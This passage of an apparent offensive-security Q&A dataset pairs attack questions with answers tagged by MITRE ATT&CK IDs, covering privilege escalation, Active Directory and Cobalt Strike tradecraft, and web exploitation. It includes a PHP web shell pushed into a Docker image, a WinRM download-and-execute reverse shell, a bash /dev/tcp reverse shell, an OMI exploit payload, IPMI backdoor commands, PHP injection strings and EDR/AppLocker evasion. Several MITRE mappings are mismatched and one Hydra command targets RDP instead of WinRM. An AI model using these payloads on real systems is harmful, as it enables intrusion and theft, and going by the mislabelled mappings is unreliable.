A: If a shell script is run with elevated privileges (e.g. via sudo) and references binaries without their full paths, an attacker can create a malicious binary with the same name in a directory that appears earlier in the $PATH environment variable. When the script is executed, it will run the attacker's malicious binary with the elevated privileges instead of the intended system binary. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you backdoor a WordPress image in a Docker Registry?
A: In the scenario where you have found a Docker Registry saving a wordpress image you can backdoor it.
**Create** the **backdoor**:

shell.phpCopy
```
<?php echo shell_exec($_GET["cmd"]); ?>
```
Create a **Dockerfile**:

DockerfileCopy
```
FROM 10.10.10.10:5000/wordpress
COPY shell.php /app/
RUN chmod 777 /app/shell.php
```
**Create** the new image, **check** it's created, and **push** it:

Copy
```
docker build -t 10.10.10.10:5000/wordpress .
 #Create
docker images
docker push registry:5000/wordpress #Push it
``` MITRE References: MITRE ID is T1073, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit a Use-After-Free vulnerability to bypass Python safety restrictions and execute arbitrary commands?
A: To bypass Python safety restrictions and execute arbitrary commands, you can exploit a Use-After-Free vulnerability. This vulnerability occurs when an object is freed but still referenced, allowing an attacker to manipulate the freed object. In the RainyDay challenge, the `safe_python` executable had such a vulnerability, which allowed the attacker to bypass the safety restrictions and execute arbitrary commands as the `jack_adm` user. The exploit code provided in the challenge leveraged this vulnerability to achieve code execution. MITRE References: MITRE ID is MITRE-ID-017, MITRE Name is: Use After Free, and MITRE Tactics are: TA0005, Defense Evasion, TA0004, Privilege Escalation.

## Q: How can you leverage a bcrypt password hashing algorithm's maximum length restriction to brute-force the secret salt and crack the root password?
A: To brute-force the secret salt and crack the bcrypt-hashed root password, you can leverage the fact that bcrypt has a maximum password length restriction. The `hash_password.py` script in the RainyDay challenge had a limit of 30 characters, which is much lower than the actual bcrypt limit of 72 bytes. By crafting a script that appends characters to the password up to the 72-byte limit, the attacker was able to reconstruct the secret salt used in the hashing process. With the salt known, the attacker could then use a custom John the Ripper rule to crack the root password hash. MITRE References: MITRE ID is MITRE-ID-018, MITRE Name is: Password Cracking, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can the EternalBlue exploit be manually executed using the PoC code from GitHub?
A: The EternalBlue exploit can be manually executed using the PoC code from GitHub at https://github.com/worawit/MS17-010. After downloading the code, you can modify the `zzz_exploit.py` file to include a reverse shell payload and execute it using the command `./zzz_exploit.py <target_ip> ntsvcs`. Note that you may need to run the script multiple times for the exploit to succeed. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: TA0009.

## Q: How can the rexec service be brute-forced?
A: The rexec service can be brute-forced by using a tool like Metasploit or hydra to attempt different username and password combinations. MITRE References: MITRE ID is T1110.001, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: Credential Access.

## Q: Explain how you can impersonate a user with a specific UID/GID to gain access to an NFS share.
A: To impersonate a user with a specific UID/GID to gain access to an NFS share, you can follow these steps:1. Create a new user on your local system with the desired UID/GID using the 'useradd' and 'usermod' commands.2. Mount the NFS share on your local system.3. Switch to the impersonated user using the 'su' command.4. With the assumed identity, you can now interact with the NFS share, potentially gaining access to files and directories that would otherwise be restricted. MITRE References: MITRE ID is T1078.003, MITRE Name is: Valid Accounts: Local Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: How can you leverage the X11 display to gain further access on a target system?
A: To leverage the X11 display to gain further access on a target system:1. Identify the presence of an X11 display by looking for files like '.Xauthority' and '.xsession' in the user's home directory.2. Steal the X11 authentication cookie (stored in the '.Xauthority' file) by reading the file and base64-encoding its contents.3. Set the 'XAUTHORITY' environment variable on the target system to the path of the stolen cookie file.4. Use the 'xwd' command to capture a screenshot of the current desktop, which may reveal sensitive information like passwords or other useful data. MITRE References: MITRE ID is T1056.001, MITRE Name is: Input Capture: Keylogging, and MITRE Tactics are: Collection.

## Q: Explain how you can leverage NFS misconfigurations and impersonation to achieve a foothold on a target system.
A: To leverage NFS misconfigurations and impersonation to achieve a foothold on a target system:1. Enumerate the NFS shares on the target system using the 'showmount' command.2. Mount the identified NFS shares on your local system.3. Analyze the permissions and ownership of the mounted shares to identify potential misconfigurations, such as overly permissive access controls.4. Create a new user on your local system with the same UID/GID as the owner of the writable NFS share.5. Impersonate the created user by switching to it using the 'su' command.6. With the assumed identity, you can now write files to the NFS share, potentially including a web shell or other malicious payload.7. Access the written payload through the web server or other means to achieve remote code execution on the target system. MITRE References: MITRE ID is T1136.001, MITRE Name is: Create Account: Local Account, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: How can you use the X11 screenshot functionality to escalate privileges on a target system?
A: To use the X11 screenshot functionality to escalate privileges on a target system:1. Identify the presence of an X11 display by looking for files like '.Xauthority' and '.xsession' in the user's home directory.2. Steal the X11 authentication cookie (stored in the '.Xauthority' file) by reading the file and base64-encoding its contents.3. Set the 'XAUTHORITY' environment variable on the target system to the path of the stolen cookie file.4. Use the 'xwd' command to capture a screenshot of the current desktop, which may reveal sensitive information like passwords or other useful data for privilege escalation. MITRE References: MITRE ID is T1072, MITRE Name is: Software Deployment Tools, and MITRE Tactics are: Privilege Escalation.

## Q: What is port knocking and how can it be used to bypass firewall restrictions?
A: Port knocking is a technique where a client sends a specific sequence of connection attempts to a series of closed ports on a server. If the correct sequence is detected, the server opens up a specific port (typically SSH) to allow access. To use port knocking to bypass firewall restrictions, the client would need to determine the correct port knock sequence by analyzing the server's configuration file (usually located at /etc/knockd.conf). Once the sequence is known, the client can run a script to send the knock sequence and then attempt to connect to the opened port. MITRE References: MITRE ID is T1205, MITRE Name is: Port Knocking, and MITRE Tactics are: Defense Evasion.

## Q: How can you use chkrootkit and a related exploit to escalate privileges on a Linux system?
A: chkrootkit is a tool used to detect rootkits on Linux systems. A known vulnerability in chkrootkit (CVE-2014-0476, exploit-db 33899) can be used to escalate privileges. This vulnerability allows a user to create a file named /tmp/update that will be executed by chkrootkit with root permissions. By creating a malicious script in /tmp/update, an attacker can execute commands with root privileges and potentially gain full control of the system. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: What tools or techniques can be used to perform AWS Redshift hacking?
A: To hack an AWS Redshift database, you can use tools and techniques such as SQL injection, brute-force attacks, and exploiting known vulnerabilities in the Redshift service or configuration. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you conduct reconnaissance on an AWS Redshift database to gather information for an attack?
A: To conduct reconnaissance on an AWS Redshift database, you can use SQL queries to gather information about the database, such as the available databases, tables, and users. You can also use tools like AWS CLI or AWS SDK to gather information about the Redshift cluster and its configuration. MITRE References: MITRE ID is T1057, MITRE Name is: Process Discovery, and MITRE Tactics are: TA0007.

## Q: What tool can be used to automate brute-force attacks against RTSP servers?
A: The tool "rtsp_authgrinder" can be used to brute-force RTSP authentication: https://github.com/Tek-Security-Group/rtsp_authgrinder MITRE References: MITRE ID is T1110.001, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: Credential Access.

## Q: What is the Cameradar tool and how can it be used to enumerate RTSP hosts and perform attacks?
A: Cameradar is a tool that can detect open RTSP hosts, get their public information, launch automated dictionary attacks to get their stream route and credentials, and more. It can be found at https://github.com/Ullaakut/cameradar. MITRE References: MITRE ID is T1106, MITRE Name is: External Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can you brute-force RabbitMQ credentials?
A: You can brute-force RabbitMQ credentials using the following methods:

- [AMQP Protocol Brute-Force](/generic-methodologies-and-resources/brute-force#amqp-activemq-rabbitmq-qpid-joram-and-solace)
- [STOMP Protocol Brute-Force](/generic-methodologies-and-resources/brute-force#stomp-activemq-rabbitmq-hornetq-and-openmq) MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: What tool can be used to brute force WordPress login credentials?
A: The WPScan tool (version 3.8.22) can be used to brute force WordPress login credentials. The command to run is: wpscan --url <url> --wordlist <wordlist> --username <username> MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What technique can be used to escalate privileges by exploiting a world-writeable system file?
A: By modifying the /etc/passwd file, which is world-writeable, a new user can be added to the root group, allowing for privilege escalation. This can be done by adding a new line to the file with the format: <username>:$6$<salt>$<hash>:<uid>:<gid>:<gecos>:<home>:<shell> MITRE References: MITRE ID is T1044, MITRE Name is: File System Permissions Weakness, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you brute force AFP?
A: You can brute force AFP using the techniques described in the [Brute Force](/generic-methodologies-and-resources/brute-force#afp) section. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you exploit CVE-2018-8007 to execute arbitrary code in CouchDB?
A: To exploit CVE-2018-8007, you need to have write permissions to the 'local.ini' file. Then, you can make a PUT request to the '/_node/couchdb@localhost/_config/cors/origins' endpoint with a malicious payload to inject a new origin and additional commands under the '[os_daemons]' section, which will execute arbitrary code. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you exploit CVE-2017-12636 to execute arbitrary code in CouchDB?
A: To exploit CVE-2017-12636, you need to have write permissions to the 'local.ini' file. Then, you can make a PUT request to the '/_node/couchdb@localhost/_config/query_servers/cmd' endpoint with a malicious payload to add a new query server, and then create a database, a document, and a design document that uses the custom query server to execute arbitrary code. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can an attacker exploit the CVE-2021-38647 vulnerability in OMI?
A: An attacker can exploit CVE-2021-38647 by sending an "ExecuteShellCommand" SOAP payload without an Authentication header, compelling the server to execute commands with root privileges. The payload looks like:<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing">   <s:Body>      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">         <p:command>id</p:command>         <p:timeout>0</p:timeout>      </p:ExecuteShellCommand_INPUT>   </s:Body></s:Envelope> MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you get a reverse shell using WinRM?
A: To get a reverse shell using WinRM, you can use the `Invoke-Command` cmdlet to execute a PowerShell command that downloads and executes a reverse shell script:

```
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
This will download and execute the reverse shell script from the specified URL on the remote machine. MITRE References: MITRE ID is T1021.006, MITRE Name is: Remote Desktop Protocol, and MITRE Tactics are: lateral-movement, execution.

## Q: How can you use Hydra to brute-force WinRM credentials?
A: To use Hydra to brute-force WinRM credentials, you can use the following command:

```
hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
This will attempt to brute-force the username and password combination against the WinRM service on the target IP address. Be careful, as brute-forcing WinRM could potentially block users. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: credential-access.

## Q: How can a pentester bypass EDR defenses to successfully perform process injection?
A: To bypass EDR defenses for successful process injection, a pentester can consider the following approaches:

1. Use alternative injection techniques, such as reflective DLL injection or process hollowing, which may not be as easily detected by the EDR.
2. Attempt to disable or bypass the EDR driver or services by exploiting vulnerabilities or misconfigurations.
3. Leverage EDR evasion techniques, such as process doppelganging or process ghosting, to make the injection appear legitimate.
4. Obfuscate or encrypt the injected code to evade detection by the EDR's analysis capabilities.

The specific techniques used will depend on the EDR's implementation and the pentester's capabilities. Continuous research and development is required to stay ahead of the evolving EDR defenses. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can an attacker use Cobalt Strike and PortBender to perform NTLM relay attacks?
A: To perform NTLM relay attacks using Cobalt Strike and PortBender: 1) Use a driver like WinDivert to redirect traffic destined for port 445 to another port. 2) Use a reverse port forward to tunnel the SMB traffic over the C2 channel to the Team Server. 3) Run ntlmrelayx on the Team Server to listen for the SMB traffic. 4) Use a SOCKS proxy to allow ntlmrelayx to send traffic back into the target network. PortBender is a reflective DLL and Aggressor script designed to help facilitate this attack through Cobalt Strike. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can the registry be modified to exploit a found "abandoned" key for privilege escalation?
A: To exploit a found "abandoned" key for privilege escalation, the necessary registry entries can be created in HKCU and pointed at a malicious Beacon DLL. This can be done using PowerShell commands such as New-Item, New-ItemProperty, and uploading the Beacon DLL to the specified location. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Registry, and MITRE Tactics are: Defense Evasion.

## Q: How can we use `make_token` to impersonate another user and access resources on a remote system?
A: To use `make_token` to impersonate another user and access resources on a remote system:1. Obtain the plaintext password for a user that has the necessary permissions on the remote system (in this case, jking who is a local admin on SRV-2).2. Run the `make_token` command in Cobalt Strike, passing the domain\username and plaintext password.3. This will impersonate the current user (DEV\bfarmer) and use the new credentials to access resources on the remote system.4. You can confirm the impersonation by running `getuid`, which will still show DEV\bfarmer.5. You can then access the C$ share on SRV-2, which was previously denied.6. To dispose of the impersonated token, use the `rev2self` command. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are some techniques for finding potentially sensitive information that has been accidentally committed to public code repositories?
A: Some techniques for finding potentially sensitive information that has been accidentally committed to public code repositories include using tools like Gitrob and Gitleaks, which can scan for secrets like API keys, passwords, and tokens using regular expressions or entropy-based detection. Manual review of code and commit history can also uncover sensitive information that has been accidentally committed. MITRE References: MITRE ID is T1213, MITRE Name is: Data from Information Repositories, and MITRE Tactics are: Discovery.

## Q: How can you perform keylogging on the X11 server?
A: Use the xspy tool to sniff keyboard keystrokes on the X11 server:
xspy 10.9.xx.xx MITRE References: MITRE ID is T1056.001, MITRE Name is: Input Capture: Keylogging, and MITRE Tactics are: TA0009.

## Q: How can you exploit the IPMI Cipher 0 vulnerability?
A: To exploit the IPMI Cipher 0 vulnerability, you can use the following Metasploit module:

use auxiliary/scanner/ipmi/ipmi_cipher_zero

You can also use ipmitool to list users and change passwords:

ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0001.

## Q: How can you exploit the IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval vulnerability?
A: To exploit the IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval vulnerability, you can use the following Metasploit module:

msf > use auxiliary/scanner/ipmi/ipmi_dumphashes MITRE References: MITRE ID is T1110.003, MITRE Name is: Brute Force: Password Spraying, and MITRE Tactics are: TA0006.

## Q: How can you exploit the Supermicro IPMI UPnP vulnerability?
A: To exploit the Supermicro IPMI UPnP vulnerability, you can use the following Metasploit module:

msf> use exploit/multi/upnp/libupnp_ssdp_overflow MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you introduce a backdoor into the BMC from the host?
A: To introduce a backdoor into the BMC from the host, you can use the following ipmitool commands:

ipmitool user list
ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0003.

## Q: How can you write a PHP webshell to a Redis instance?
A: You can write a PHP webshell to a Redis instance by setting the 'dir' config to the web server's document root, setting the 'dbfilename' to 'redis.php', and then setting the 'test' key to the PHP code you want to execute. MITRE References: MITRE ID is T1505.003, MITRE Name is: Server Software Component: Web Shell, and MITRE Tactics are: TA0004.

## Q: How can you use a Redis instance to execute arbitrary commands on the server?
A: You can execute arbitrary commands on the server by compiling a Redis module that allows command execution, uploading the module to the Redis instance, and then loading and using the module to execute commands. MITRE References: MITRE ID is T1569.002, MITRE Name is: System Services: Service Execution, and MITRE Tactics are: TA0004.

## Q: How can you exploit a Redis instance using an SSRF vulnerability in a web application?
A: If you can send clear text requests to a Redis instance, you can communicate with it and execute arbitrary commands. You can abuse an SSRF vulnerability and a CRLF vulnerability in a web application to talk to the Redis instance and execute commands, as demonstrated in the Gitlab 11.4.7 RCE example. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you bypass AppLocker's default rules?
A: There are several ways to bypass AppLocker's default rules:
1. Execute untrusted code via trusted LOLBAS (Living Off The Land Binaries and Scripts) tools.
2. Find writable directories within "trusted" paths.
3. By default, AppLocker is not applied to Administrators.
Custom, poorly-written, or overly-permissive AppLocker rules can also introduce loopholes that can be exploited. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass AppLocker by uploading a binary to a writable directory?
A: You can bypass AppLocker by uploading a binary to a writable directory, such as `C:\Windows\Tasks`, which is writable by standard users. This can be done in an assumed breach scenario where you have access to the machine but are restricted by AppLocker. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass AppLocker's DLL enforcement?
A: DLL enforcement is rarely enabled in AppLocker due to the additional load it can put on the system and the amount of testing required to ensure nothing will break. Cobalt Strike can output Beacon to a DLL that can be run with `rundll32`. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion.

## Q: How can an unsafe use of reflection in a .NET application be abused to bypass WDAC?
A: The example code demonstrates how an application that dynamically loads and executes a .NET assembly can be used to bypass WDAC. By taking a user-supplied path to a .NET assembly, reading the bytes, and then invoking the assembly's entry point, the trusted application is executing untrusted code, similar to how a LOLBAS works. This can be used to execute tools or payloads that are otherwise blocked by WDAC. MITRE References: MITRE ID is T1216, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker use Mimikatz to generate a Golden Ticket?
A: The attacker can use the `kerberos::golden` command in Mimikatz to generate a Golden Ticket. This requires obtaining the NTLM/AES secret of the krbtgt account, which can be done using the `dcsync` command in Mimikatz to perform a Domain Controller Synchronization attack. The generated Golden Ticket can then be used to impersonate any user, to any service, on any machine in the domain. MITRE References: MITRE ID is T1558.002, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: CredentialAccess, PrivilegeEscalation, LateralMovement.

## Q: How can the DllImport attribute be used to circumvent some AV signatures?
A: The DllImport attribute can be used to call Windows API functions without using their actual names. By using the ordinal value of the exported function, instead of the function name, it is possible to bypass AV signatures that may be looking for specific API calls. This is done by setting the EntryPoint property of the DllImport attribute to the hexadecimal ordinal value, converted to decimal, instead of the function name. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: Defense Evasion, Execution.

## Q: What exploit can be used to gain remote code execution on the Drupal server and what modifications are required to the exploit?
A: Exploit-DB 41564 can be used to exploit a remote code execution vulnerability in Drupal 7.x. The exploit requires a few small modifications to run successfully, including fixing a syntax error on line 16 and line 71, and modifying the variables url, endpoint_path, filename and data. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can you achieve PHP code execution on the Drupal server after gaining admin access?
A: After gaining admin access, you can enable the PHP Filter module on the Modules page. Then, you can create a new article, paste PHP code into the body, change the Text format to PHP code, and click Preview to execute the PHP code. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can you use kwprocessor to generate a list of keywalk passwords and search for the 'qwerty' password in the output?
A: You can use the following command to generate a list of keywalk passwords with kwprocessor:

kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o keywalk.txt

Then, you can search for the 'qwerty' password in the output using PowerShell:

Select-String -Pattern "^qwerty$" -Path keywalk.txt -CaseSensitive MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: PowerShell, and MITRE Tactics are: Execution.

## Q: How can you change the pipe names used by Beacon to avoid detection?
A: To change the pipe names used by Beacon, you can use the `pipename_stager` and `ssh_pipename` Malleable C2 directives, as well as the `set pipename` directive in the `post-ex` block. This allows you to use more random or legitimate-looking pipe names to avoid detection. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker bypass the Constrained Language Mode (CLM) imposed by AppLocker?
A: Since CLM is as fragile as AppLocker, any AppLocker bypass can result in a CLM bypass. Beacon has a `powerpick` command, which is an "unmanaged" implementation of tapping into a PowerShell runspace, without using `powershell.exe`. This allows the attacker to execute post-exploitation tooling outside of the restricted CLM environment. `powerpick` is also compatible with `powershell-import`. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How does the abuse of constrained delegation using Rubeus work, and what are the steps involved?
A: The abuse of constrained delegation using Rubeus works as follows:

1. Rubeus first builds an S4U2self request and obtains a TGS for the user 'nlamb' to the service 'srv-2/dev.cyberbotic.io'.
2. It then builds an S4U2proxy request to obtain a TGS for 'nlamb' to the service 'cifs/wkstn-2.dev.cyberbotic.io'.

This works because the service 'srv-2' is specifically trusted for delegation to that service. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: CredentialAccess, Lateral Movement.

## Q: How can you abuse the S4U2self extension to gain access to a domain computer if you have its TGT, RC4, or AES256 credentials?
A: To abuse the S4U2self extension to gain access to a domain computer, you can follow these steps:

1. Obtain the TGT for the target computer, such as through the Printer Bug exercise.
2. Import the TGT into a sacrificial session and attempt to access the C$ share of the target computer, which will fail.
3. Use Rubeus to build an S4U2self request for the target computer account and obtain a TGS to itself as a user you know is a local admin (e.g., a domain admin).
4. Modify the ticket to change the service name from the computer account to 'cifs' and the FQDN of the machine.
5. Use the modified ticket to access the target computer's C$ share. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: CredentialAccess, Lateral Movement.

## Q: How can you abuse the web application's registration API to gain administrative privileges?
A: By crafting a malicious registration request and setting the 'admin' field to 'true', it may be possible to register a new user with administrative privileges. This can lead to a privilege escalation vulnerability if the application's backend logic does not properly validate and restrict user roles during registration. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: What is the Apache James vulnerability described in the challenge, and how can it be exploited to gain access to the system?
A: The Apache James server version 2.3.2 has a remote code execution vulnerability that can be exploited using the default admin credentials. The exploit is available on Exploit-DB (https://www.exploit-db.com/exploits/35513/). The vulnerability can be exploited by modifying the payload variable in the exploit to execute a reverse shell, such as 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'. Once a user logs into the system, the exploit will trigger and provide an unrestricted user shell. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: How can you escalate privileges on the system after gaining a user shell?
A: After gaining a user shell, running the LinEnum script (https://github.com/rebootuser/LinEnum) reveals a world-writable Python script owned by root. By appending or replacing the contents of this script, it is possible to execute code as root and obtain a privileged shell. The script is run regularly, so any modifications made to it will be executed, leading to a root shell. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you brute force Rsync credentials?
A: You can brute force Rsync credentials using the generic brute force methodology described in the [Brute Force](/generic-methodologies-and-resources/brute-force#rsync) section. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you leverage Kerberos credential cache (ccache) files on a compromised domain-joined Linux machine to request service tickets (TGSs) for other services in the domain?
A: Kerberos credential cache (ccache) files hold the Kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. By compromising such a machine, you can extract the ccache of any authenticated user and use it to request service tickets (TGSs) for any other service in the domain. First, access the console of the compromised machine and use PuTTY to SSH into it as a user with privileges. Then, use your foothold on the attacking machine to SSH into the compromised machine as a member of the Oracle Admins group. The ccache files are stored in /tmp and are prefixed with krb5cc. Since the permissions only allow access by the user and root, you'll need root privileges to access them. You can use the `sudo -i` command to escalate your privileges. Once you have the ccache file, you can use the Impacket `ticketConverter` tool to convert it from the ccache format to the kirbi format that Cobalt Strike can use with the `kerberos_ticket_use` command. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: TA0006, Credential Access.

## Q: What is a UAC bypass and how can it be used to gain elevated privileges on a Windows system?
A: A UAC bypass is a technique that allows an application to elevate from Medium to High Integrity without prompting for consent. This is not technically an Elevation of Privilege (EoP) because Microsoft does not consider UAC to be a security boundary. However, it can be used to execute code with elevated privileges without the user's explicit consent. Cobalt Strike provides two methods for UAC bypasses: the `elevate` command, which bootstraps a listener via a chosen technique, and the `runasadmin` command, which allows execution of arbitrary commands with elevated privileges. MITRE References: MITRE ID is T1548.002, MITRE Name is: Abuse Elevation Control Mechanism: Bypass User Account Control, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What is a directory traversal attack and how can it be used to retrieve sensitive files from a web server?
A: A directory traversal attack, also known as a path traversal attack, is a type of vulnerability where a web application does not properly sanitize user input, allowing an attacker to access files and directories outside of the web root. This can be used to retrieve sensitive files like configuration files, private keys, or password hashes. To exploit a directory traversal vulnerability, an attacker can use relative paths like '../' to traverse up the directory structure and access files they should not be able to. For example, accessing '/../../etc/passwd' on a Linux system could reveal the contents of the password file. Directory traversal attacks are often used to gather information, but can potentially lead to system access if sensitive files like SSH private keys are discovered. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: How can you use curl or other tools to retrieve sensitive files through a directory traversal vulnerability, rather than relying on a web browser?
A: When testing for directory traversal vulnerabilities, it's important to use tools like curl or custom scripts rather than a web browser. Browsers will often try to parse or format the retrieved content, which can make it harder to identify the true vulnerability. Using curl allows you to make the raw HTTP requests and view the unprocessed file contents. For example, to retrieve a file like '/../../etc/passwd' using curl, you would run a command like 'curl http://example.com/page.php?file=../../etc/passwd'. This will return the contents of the /etc/passwd file directly, without any browser-side processing. Using tools outside the browser is a more reliable way to confirm and explore the depth of a directory traversal vulnerability. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can an attacker bypass the limitation of executing commands with spaces in an LFI vulnerability?
A: To bypass the limitation of executing commands with spaces in an LFI vulnerability, the attacker can use URL encoding to represent the space character. Instead of a space, the attacker can use %20 in the command parameter. This allows the attacker to execute commands with parameters without issues. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can the data:// wrapper be used to achieve code execution in a web application with a file inclusion vulnerability?
A: The data:// wrapper can be used to embed data directly into the web application's code and achieve code execution. By using data://text/plain,<?php system('ls'); ?> or data://text/plain,<?=`ls`?> you can inject PHP code that will be executed when the file is included. If basic filters are in place, you can also try using base64 encoding to bypass them, like data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you leverage directory traversal vulnerabilities by using URL encoding?
A: To leverage directory traversal vulnerabilities using URL encoding, you can encode the dots (".") in the directory path with the percent-encoded representation "%2e". This can allow you to bypass filters that only check for the plain-text "../" sequence, as the web application or server may interpret the encoded characters as a valid request. MITRE References: MITRE ID is T1570, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass a file upload filter that blocks PHP files?
A: One method to bypass a file upload filter blocking PHP files is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. This may allow you to bypass simple filters that only check for the most common file extensions, .php and .phtml. Another way is to change characters in the file extension to uppercase, as the blacklist may be case-sensitive and only check for lowercase PHP extensions. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion.

## Q: How can the Python3 http.server module be used to host and serve a file for Remote File Inclusion (RFI) exploitation?
A: The Python3 http.server module can be used to start a web server and serve files from the current directory. To use it for RFI exploitation, you can navigate to the directory containing the malicious file (e.g. a webshell) and run 'python3 -m http.server' to start the server. The file can then be included remotely by the target system, allowing you to execute commands on the target in the context of the web application. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What are some techniques an attacker can use to bypass command injection filters?
A: To bypass command injection filters, an attacker can try techniques such as:- Using URL-encoded characters like semicolons (%3B) or ampersands (%26) to separate multiple commands- Trying different command delimiters like the backtick character (`) or pipe (|)- Leveraging alternative command interpreters like PowerShell or Bash- Attempting to leverage environment variables or other indirect methods to execute commands- Using obfuscation techniques to hide the malicious payloadThe specific approach depends on the web application's implementation and the filtering mechanisms in place. MITRE References: MITRE ID is T1562, MITRE Name is: Impair Defenses, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker use the Git version command to detect the underlying operating system in a command injection scenario?
